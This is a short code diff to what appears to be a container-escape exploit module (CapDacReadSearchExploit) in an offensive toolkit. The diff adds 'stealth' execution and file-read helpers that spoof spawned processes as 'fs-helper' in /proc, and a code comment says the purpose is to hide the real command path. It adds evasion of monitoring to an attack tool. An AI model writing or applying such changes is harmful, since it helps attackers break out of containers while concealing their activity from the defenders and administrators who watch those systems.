@@ -20,9 +20,7 @@ limitations under the License.
 package escaping
 
 import (
-	"io/ioutil"
 	"os"
-	"os/exec"
 	"strings"
 
 	"github.com/cdk-team/CDK/pkg/audit/base"
@@ -107,11 +105,19 @@ func init() {
 }
 
 func execCommand(cmdSlice []string) {
-	cmd := exec.Command(cmdSlice[0], cmdSlice[1:]...)
+	// Use StealthExec with argv[0] spoofing so the spawned process
+	// appears as "fs-helper" in /proc/PID/cmdline rather than
+	// the raw command path.
+	cmd := util.StealthExecCommand(cmdSlice[0], util.StealthExecOptions{
+		Argv0:     "fs-helper",
+		Comm:      "fs-helper",
+		ExtraArgs: cmdSlice[1:],
+	})
 	cmd.Stdout = os.Stdout
 	cmd.Stdin = os.Stdin
 	cmd.Stderr = os.Stderr
-	if err := cmd.Run(); err != nil {
+	util.StealthExecStart(cmd, "fs-helper")
+	if err := cmd.Wait(); err != nil {
 		log.Fatalf("[-] Run cmd: %s\n", err)
 	}
 }
@@ -171,7 +177,7 @@ func CapDacReadSearchExploit(target, ref string, chroot bool, cmd []string) erro
 	}
 
 	var content []byte
-	if content, err = ioutil.ReadFile(fmt.Sprintf("./%s", target)); err != nil {
+	if content, err = util.StealthReadFile(fmt.Sprintf("./%s", target)); err != nil {
 		log.Fatalf("[-] read file: %s\n", content)
 	}
 
